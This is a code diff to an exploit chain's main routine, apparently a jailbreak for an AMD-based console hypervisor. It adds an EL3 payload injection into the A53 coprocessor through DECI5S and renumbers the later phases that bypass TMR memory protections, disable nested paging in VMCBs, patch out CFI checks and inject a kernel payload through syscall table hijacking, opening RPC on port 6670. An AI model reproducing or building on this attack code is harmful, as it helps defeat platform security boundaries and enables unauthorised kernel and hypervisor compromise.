@@ -205,8 +205,40 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 1: TMR bypass */
-    printf("\n[*] Phase 1: TMR bypass...\n");
+    /* Phase 1: DECI5S init + MP4 payload injection.
+     *
+     * Inject our AArch64 EL3 payload into the A53 coprocessor DRAM
+     * via DECI5S protocol. This must happen BEFORE TMR bypass because
+     * TMR 20 temporarily disables MP4 DRAM protection.
+     *
+     * The injection arms a jmpbuf trigger — the next A53 exception
+     * activates our payload hook. */
+    printf("\n[*] Phase 1: MP4 payload injection via DECI5S...\n");
+
+    ret = deci5s_inject_payload(&ctx);
+    if (ret != 0) {
+        printf("[!] MP4 payload injection failed: %d\n", ret);
+        return ret;
+    }
+    printf("[+] MP4 payload injected and armed\n");
+
+    /* Wait for A53 to process the next IRQ and activate our hooks.
+     * The jmpbuf trigger fires IC IALLU (cache flush) on the next
+     * exception, making our patched code visible to the A53. */
+    printf("[*] Waiting for payload activation...\n");
+    usleep(500000);  /* 500ms — A53 handles periodic interrupts */
+
+    ret = mp4_ping(&ctx);
+    if (ret != 0) {
+        printf("[!] MP4 payload not responding after injection\n");
+        printf("[!] The A53 may not have processed an IRQ yet.\n");
+        printf("[*] Continuing anyway — TMR bypass may trigger it.\n");
+    } else {
+        printf("[+] MP4 payload alive and responding!\n");
+    }
+
+    /* Phase 2: TMR bypass */
+    printf("\n[*] Phase 2: TMR bypass...\n");
 
     ret = tmr_bypass_init(&ctx);
     if (ret != 0) {
@@ -218,8 +250,8 @@ int prosperous_run(void)
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
-    /* Phase 2: Disable HV TMR protections */
-    printf("\n[*] Phase 2: Disabling HV TMR protections...\n");
+    /* Phase 3: Disable HV TMR protections */
+    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");
 
     ret = tmr_disable_hv_regions(&ctx);
     if (ret != 0) {
@@ -229,14 +261,14 @@ int prosperous_run(void)
     }
     printf("[+] HV TMR protections disabled\n");
 
-    /* Phase 3: VMCB patching via GPU SDMA (flatz method)
+    /* Phase 4: VMCB patching via MP4 (A53) coprocessor.
      *
      * x86 cannot access VMCB memory (NPT blocks it). Instead, we use
-     * the GPU's SDMA engine to DMA-copy VMCB data to/from accessible
-     * bounce buffers. The GPU goes through IOMMU, bypassing x86 NPT.
-     * TMR bypass above enables GFX source access to HV memory.
+     * the A53 coprocessor (running our EL3 payload) to read/write VMCB
+     * data. The A53 accesses system PAs through SysHub, bypassing x86 NPT.
+     * TMR bypass above removed data fabric protections on HV memory.
      */
-    printf("\n[*] Phase 3: VMCB patching via GPU SDMA...\n");
+    printf("\n[*] Phase 4: VMCB patching via MP4 coprocessor...\n");
 
     ret = vmcb_patch_disable_np(&ctx);
     if (ret != 0) {
@@ -246,8 +278,8 @@ int prosperous_run(void)
     }
     printf("[+] Nested paging disabled on all VMCBs\n");
 
-    /* Phase 4: CFI bypass */
-    printf("\n[*] Phase 4: CFI bypass...\n");
+    /* Phase 5: CFI bypass */
+    printf("\n[*] Phase 5: CFI bypass...\n");
 
     ret = cfi_bypass(&ctx);
     if (ret != 0) {
@@ -257,13 +289,13 @@ int prosperous_run(void)
     }
     printf("[+] CFI check_fail patched\n");
 
-    /* Phase 5: Restore TMR protections */
-    printf("\n[*] Phase 5: Restoring TMR protections...\n");
+    /* Phase 6: Restore TMR protections */
+    printf("\n[*] Phase 6: Restoring TMR protections...\n");
     tmr_restore_hv_regions(&ctx);
     printf("[+] TMR protections restored\n");
 
-    /* Phase 6: Kernel payload injection */
-    printf("\n[*] Phase 6: Kernel payload injection...\n");
+    /* Phase 7: Kernel payload injection */
+    printf("\n[*] Phase 7: Kernel payload injection...\n");
     printf("[*] kpayload will be injected via syscall table hijack.\n");
     printf("[*] After injection, connect to port 6670 for RPC access.\n");
 
